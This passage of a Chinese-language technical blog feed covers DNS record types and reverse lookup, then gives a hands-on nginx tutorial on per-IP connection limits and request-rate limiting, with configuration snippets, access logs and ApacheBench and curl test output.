A，而其他的标志使用 CNAME 时，那么当 IP 更改，那你只要修订一个 A 的标志，其他的 CNAME 就跟着变动了！处理起来比较容易啊！ </p><hr><ul><li><strong>MX ：查询某领域名的邮件服务器主机名</strong> </li></ul><p>MX 是 Mail eXchanger (邮件交换) 的意思，通常你的整个领域会设定一个 MX ，代表，所有寄给这个领域的 email 应该要送到后头的 email server 主机名上头才是 </p><hr><h4 id="反向解析RR数据"><a href="#反向解析RR数据" class="headerlink" title="反向解析RR数据"></a>反向解析RR数据</h4><p>在讲反解之前，先来谈谈正解主机名的追踪方式。以 <a href="http://www.api.haoshiqi.net" target="_blank" rel="noopener">www.api.haoshiqi.net</a>. 来说，整个网域的概念来看， 越右边出现的名称代表网域越大！举例来说，.(root) &gt; net &gt; haoshiqi 以此类推。因此追踪时，是由大范围找到小范围， </p><p>但是 IP 则不一样啊！以我们的114.55.224.232 来说好了，当然是 114 &gt; 55 &gt; 224 &gt; 232 ，左边的网域最大！ 与预设的 DNS 从右边向左边查询不一样啊！那怎办？为了解决这个问题，所以反解的 zone 就必须要将 IP 反过来写，而在结尾时加上 .in-addr.arpa. 的结尾字样即可。所以，当你想要追踪反解时，那么反解的结果就会是： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig -x 114.55.224.232</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;232.224.55.114.in-addr.arpa.INPTR</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">55.114.in-addr.arpa.225INSOArdns1.alidns.com. dnsmgr.alibaba-inc.com. 2015011323 1800 600 1814400 300</span><br></pre></td></tr></table></figure><p>PTR就是反向解析的意思.要注意的就是 zone 的名称了！要将 IP 反转过来写，并且结尾加上 .in-addr.arpa. 才行 </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;DNS介绍&quot;&gt;&lt;a href=&quot;#DNS介绍&quot; class=&quot;headerlink&quot; title=&quot;DNS介绍&quot;&gt;&lt;/a&gt;DNS介绍&lt;/h3&gt;&lt;p&gt;IP地址虽然采用了十分记数法.但是对于人脑来说还是非常难以记忆,但是访问互联网网站又一定需要IP,为了应对这个问题.早期的时候是通过hosts文件来绑定主机名和IP的对应关系,&lt;/p&gt;
&lt;p&gt;但是这种方法存在非常多的不足,特别是IP和主机名的对应关系越来越多的时候.hosts档案完全无法满足人们的需求.这个时候,伯克利大学发展出一套主机名IP对应系统.称为Berkeley Internet Name Domain, BIND  .也就是目前全世界使用最广泛的Domain Name System, DNS &lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Service" scheme="https://jesse.top/categories/Linux-Service/"/>
    
    
      <category term="DNS" scheme="https://jesse.top/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>nginx针对单个IP限制并发连接,限流</title>
    <link href="https://jesse.top/2018/08/03/Linux-Web/nginx%E9%92%88%E5%AF%B9%E5%8D%95%E4%B8%AAIP%E9%99%90%E5%88%B6%E5%B9%B6%E5%8F%91%E8%BF%9E%E6%8E%A5,%E9%99%90%E6%B5%81%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/"/>
    <id>https://jesse.top/2018/08/03/Linux-Web/nginx针对单个IP限制并发连接,限流功能介绍/</id>
    <published>2018-08-03T03:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nginx针对单个IP限制并发连接-限流实战"><a href="#nginx针对单个IP限制并发连接-限流实战" class="headerlink" title="nginx针对单个IP限制并发连接,限流实战"></a>nginx针对单个IP限制并发连接,限流实战</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>最近在流量高峰期时,后端数据库服务器面临非常大的压力.mysql被大量的update.select语句挤爆,慢查询记录能瞬间达千条以上.导致业务不能正常访问.监控平台不断报警.</p><p>nginx有自带的模块可以针对每一个IP限制并发连接数..还可以限制每一个IP在单位时间内的request请求频率.</p><a id="more"></a><hr><h3 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h3><ul><li><p><strong>ngx_http_limit_conn_module</strong> :  <a href="http://nginx.org/en/docs/http/ngx_http_limit_conn_module.html#limit_conn_zone" target="_blank" rel="noopener">官方文档</a>  Used to limit the number of connections per the defined key, in particular, the number of connections from a single IP address. </p><p><strong>limit_conn模块用来限制IP的并发请求连接.</strong></p></li><li><p><strong>ngx_http_limit_req_module</strong> :  <a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html" target="_blank" rel="noopener">官方文档</a>  Used to limit the request processing rate per a defined key, in particular, the processing rate of requests coming from a single IP address </p><p><strong>limit_req模块用来限制IP在单位时间内request请求频率</strong></p></li></ul><p>可以看到,limit_conn模块用来限制单个IP的并发连接.limit_req模块用来限制单IP入站请求的频率</p><hr><h3 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h3><p>nginx版本: nginx/1.12.2</p><p>操作系统: Cetntos 7.4</p><p>拓扑: 阿里云SLB+3台nginx ECS服务器</p><hr><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h3 id="一-limit-conn模块限制IP并发连接"><a href="#一-limit-conn模块限制IP并发连接" class="headerlink" title="一.limit_conn模块限制IP并发连接"></a>一.limit_conn模块限制IP并发连接</h3><p>配置方法非常简单.</p><p>1.在nginx.conf的http字段中添加以下一行配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">   limit_conn_zone $http_x_forwarded_for zone=perip:10m;</span><br><span class="line">   .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令格式:</p><p>limit_conn_zone :指令.在Nginx 1.1.8以后用此指令替代了此前的limit_conn指令</p><p>zone: 表示一个命名空间.</p><p>perip:表示一个名字,这个名字可以随意取.</p><p>10m: 存储IP地址的内存地址空间,一个Ipv4的地址大概占据64bit的空间.详情可见官方文档说明</p><p>$http_x_forwarded_for: 这个是根据实际的日志格式来获取IP地址.一般情况下这里应该是$remote_addr.</p><p>但是我们的日志格式为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">  log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &quot;$http_cookie&quot; &quot;$http_user_agent&quot;&apos;</span><br><span class="line">                      &apos;$remote_addr $server_addr $upstream_addr $host&apos;</span><br><span class="line">                      &apos;&quot;$http_x_forwarded_for&quot; $upstream_response_time &quot;$request_time&quot;&apos;;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日志记录格式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">100.117.85.149 - - [03/Aug/2018:13:15:21 +0800] &quot;GET / HTTP/1.0&quot; 200 28632 &quot;-&quot; &quot;-&quot; &quot;ApacheBench/2.3&quot;100.117.85.149 10.27.3.27 unix:/run/php-fpm/php-fpm.sock &quot;27.115.51.xx&quot; 0.237 &quot;0.237&quot;</span><br></pre></td></tr></table></figure><p>在我们的日志格式里.第一个IP字段(100.117.85.149)是个私网地址,是阿里的SLB的反代地址.而倒数第三个字段的IP地址(我隐去了最后一位IP字段)才是真正的阿里云SLB传递的客户端真实IP.</p><p>所以需要根据http_x_forwarded_for字段来限制IP</p><p>如果nginx是作为最前端的web服务器.那么默认的main日志格式应该是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日志记录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.0.4.241 - - [03/Aug/2018:02:20:41 +0800] &quot;GET / HTTP/1.0&quot; 200 225 &quot;-&quot; &quot;ApacheBench/2.3&quot; &quot;-&quot;</span><br><span class="line">10.0.4.241 - - [03/Aug/2018:02:20:41 +0800] &quot;GET / HTTP/1.0&quot; 200 225 &quot;-&quot; &quot;ApacheBench/2.3&quot; &quot;-&quot;</span><br><span class="line">10.0.4.241 - - [03/Aug/2018:02:20:41 +0800] &quot;GET / HTTP/1.0&quot; 200 225 &quot;-&quot; &quot;ApacheBench/2.3&quot; &quot;-&quot;</span><br><span class="line">10.0.4.241 - - [03/Aug/2018:02:20:41 +0800] &quot;GET / HTTP/1.0&quot; 200 225 &quot;-&quot; &quot;ApacheBench/2.3&quot; &quot;-&quot;</span><br><span class="line">10.0.4.241 - - [03/Aug/2018:02:20:41 +0800] &quot;GET / HTTP/1.0&quot; 200 225 &quot;-&quot; &quot;ApacheBench/2.3&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>这里第一个字段remote_addr是客户端的真实IP地址.那么上面的指令应该改成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">   limit_conn_zone $remote_addr zone=perip:10m;</span><br><span class="line">   .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>NOTE:官方文档建议使用$binary_remote_addr替代$remote_addr.这样好处是可以节省内存存储空间.</p><p>但是我尝试过$binary_http_x_forwarded_for并不能被nginx识别:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; [work@tongji-1 nginx]$ sudo nginx -t</span><br><span class="line">&gt; nginx: [emerg] unknown &quot;binary_http_x_forwarded_for&quot; variable</span><br><span class="line">&gt; nginx: configuration file /etc/nginx/nginx.conf test failed</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>由此可见.该指令需要根据实际日志格式中,真实IP所在的字段位置和变量名来具体配置.</p><p>2.在虚拟主机配置文件中调用该指令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#隐去了敏感配置信息</span><br><span class="line">[work@tongji-1 nginx]$ vim conf.d/tongji.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">   ......</span><br><span class="line">   location / &#123;</span><br><span class="line">        limit_conn perip 5;</span><br><span class="line">        root   /data/apps/piwik;</span><br><span class="line">        index  index.php;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        limit_conn perip 5;</span><br><span class="line">        root           /data/apps/piwik;</span><br><span class="line">        fastcgi_pass   unix:/run/php-fpm/php-fpm.sock;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指令格式:</p><p><strong>limit_conn perip 5;</strong> </p><p><strong>limit_conn:</strong> 模块指令,改指令可以用在<strong>http,server以及location字段</strong>.代表的作用域分别是:全局nginx,全局server_name,以及某个路径</p><p><strong>perip:</strong>调用nginx.conf的perip zone</p><p>5: 允许最大的并发数为5</p><hr><p><strong>测试效果</strong></p><p>在另外一台服务器用ab进行一次测试:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@kong ~]# ab -n 50 -c 20 http://www.xxxxxx.com/</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 1430300 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking tongji.doweidu.com (be patient).....done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:</span><br><span class="line">Server Hostname:        www.xxxxxx.com</span><br><span class="line">Server Port:            80</span><br><span class="line"></span><br><span class="line">Document Path:          /</span><br><span class="line">Document Length:        28618 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      20</span><br><span class="line">Time taken for tests:   2.002 seconds</span><br><span class="line">Complete requests:      50</span><br><span class="line">Failed requests:        29</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 29, Exceptions: 0)</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure><p>ab模拟了20个并发,一共50个request请求的压测.从输出结果的failed requests字段来看,有29个请求失败.结果并不是十分精准.而且每次执行统一的步骤得出的结果并不一致.</p><p>查看nginx服务器的access访问日志输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#为了隐私,隐去了IP地址最后一位,以及网站域名</span><br><span class="line"></span><br><span class="line">[work@tongji-1 conf.d]$ grep &apos;27.115.51.xx&apos; /data/logs/nginx/tongji.access.log | grep &apos;\b503\b&apos;</span><br><span class="line"></span><br><span class="line">100.117.85.54 - - [03/Aug/2018:13:17:20 +0800] &quot;GET / HTTP/1.0&quot; 503 537 &quot;-&quot; &quot;-&quot; &quot;ApacheBench/2.3&quot;100.117.85.54 10.27.3.27 - www.xxxx.com&quot;27.115.51.xx&quot; - &quot;0.000&quot;</span><br><span class="line">100.117.85.96 - - [03/Aug/2018:13:17:20 +0800] &quot;GET / HTTP/1.0&quot; 503 537 &quot;-&quot; &quot;-&quot; &quot;ApacheBench/2.3&quot;100.117.85.96 10.27.3.27 - www.xxxx.com&quot;27.115.51.xx&quot; - &quot;0.000&quot;</span><br><span class="line">100.117.85.81 - - [03/Aug/2018:13:17:20 +0800] &quot;GET / HTTP/1.0&quot; 503 537 &quot;-&quot; &quot;-&quot; &quot;ApacheBench/2.3&quot;100.117.85.81 10.27.3.27 - www.xxxx.com&quot;27.115.51.xx&quot; - &quot;0.000&quot;</span><br><span class="line">100.117.85.167 - - [03/Aug/2018:13:17:20 +0800] &quot;GET / HTTP/1.0&quot; 503 537 &quot;-&quot; &quot;-&quot; &quot;ApacheBench/2.3&quot;100.117.85.167 10.27.3.27 - www.xxxx.com&quot;27.115.51.xx&quot; - &quot;0.000&quot;</span><br><span class="line">100.117.85.114 - - [03/Aug/2018:13:17:20 +0800] &quot;GET / HTTP/1.0&quot; 503 537 &quot;-&quot; &quot;-&quot; </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>可见Nginx阻止了很多请求,并且返回503错误.这表示验证是成功.Ningx确实能阻止部分的并发请求.</p><blockquote><p>Note:</p><ol><li>根据官网文档的解释来看,一旦nginx分配给Limit_conn模块的10M内存空间消耗完,就对于所有流量的请求都返回503错误</li><li>个人认为这个模块并不十分成熟,至少我在公司,家里的2个测试环境都没有成功.而且尝试过nginx多个版本,多个系统平台上都没有成功.</li></ol></blockquote><hr><h3 id="二-IP限流配置"><a href="#二-IP限流配置" class="headerlink" title="二.IP限流配置"></a>二.IP限流配置</h3><p>配置方式和上文中大同小异,只是具体的指令不同.所以部分配置不再详细解释</p><p>1.在nginx.conf配置文件的http字段中添加如下一行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">    limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析:</p><p>rate=1r/s 表示每秒的请求次数为1次.</p><p>2.在虚拟主机配置下添加一行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">       listen 80;</span><br><span class="line">       server_name www.test.com;</span><br><span class="line">       root /var/www/test;</span><br><span class="line">       index index.html;</span><br><span class="line"></span><br><span class="line">       access_log /var/log/nginx/test.access.log;</span><br><span class="line">       error_log  /var/log/nginx/test.error.log;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">          limit_req zone=one burst=1 nodelay;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">limit_req指令可以放在server,http或者location字段</span><br><span class="line"></span><br><span class="line">burst: 这个字段表示允许5次的上浮.如果第1秒、2,3,4秒请求都为1个，那么第5秒的请求为2个是被允许的。</span><br><span class="line">       但是如果你第1秒就2个请求，第2秒超过1的请求返回503错误。</span><br><span class="line"></span><br><span class="line">nodelay: 如果不设置该选项，严格使用平均速率限制请求数,第1秒5个请求时，4个请求放到第2秒执行，</span><br><span class="line">         设置nodelay，5个请求将在第1秒执行。</span><br></pre></td></tr></table></figure><hr><p><strong>测试</strong></p><p>在另外一台服务器执行访问nginx服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@kong ~]# curl -i http://www.test.com/index.html</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.12.2</span><br><span class="line">Date: Thu, 02 Aug 2018 22:11:55 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 225</span><br><span class="line">Last-Modified: Wed, 27 Jun 2018 21:46:49 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: &quot;5b3405c9-e1&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">   &lt;title&gt;Welcome to ansible &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;nginx,configured by ansible&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If you see this,Ansible successfully installed nginx.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Ansible managed&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">[root@kong ~]# curl -i http://www.test.com/index.html</span><br><span class="line">HTTP/1.1 503 Service Temporarily Unavailable</span><br><span class="line">Server: nginx/1.12.2</span><br><span class="line">Date: Thu, 02 Aug 2018 22:11:55 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 213</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;503 Service Temporarily Unavailable&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;503 Service Temporarily Unavailable&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.12.2&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>测试可见,第一次请求是正常的..但是当1秒内第二次请求时就返回503错误了.提示503 Service Temporarily Unavailable</p><p>用ab测试结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@kong ~]# ab -n 10 -c 2 http://www.test.com/</span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 1430300 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking www.test.com (be patient).....done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        nginx/1.12.2</span><br><span class="line">Server Hostname:        www.test.com</span><br><span class="line">Server Port:            80</span><br><span class="line"></span><br><span class="line">Document Path:          /</span><br><span class="line">Document Length:        225 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      2</span><br><span class="line">Time taken for tests:   0.013 seconds</span><br><span class="line">Complete requests:      10</span><br><span class="line">Failed requests:        8</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>我个人认为这个模块还是非常准确的.发起10次请求里,有8次失败.</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;nginx针对单个IP限制并发连接-限流实战&quot;&gt;&lt;a href=&quot;#nginx针对单个IP限制并发连接-限流实战&quot; class=&quot;headerlink&quot; title=&quot;nginx针对单个IP限制并发连接,限流实战&quot;&gt;&lt;/a&gt;nginx针对单个IP限制并发连接,限流实战&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;最近在流量高峰期时,后端数据库服务器面临非常大的压力.mysql被大量的update.select语句挤爆,慢查询记录能瞬间达千条以上.导致业务不能正常访问.监控平台不断报警.&lt;/p&gt;
&lt;p&gt;nginx有自带的模块可以针对每一个IP限制并发连接数..还可以限制每一个IP在单位时间内的request请求频率.&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-Web" scheme="https://jesse.top/categories/Linux-Web/"/>
    
    
      <category term="nginx" scheme="https://jesse.top/tags/nginx/"/>
    
      <category term="web" scheme="https://jesse.top/tags/web/"/>
    
  </entry>
  
</feed>
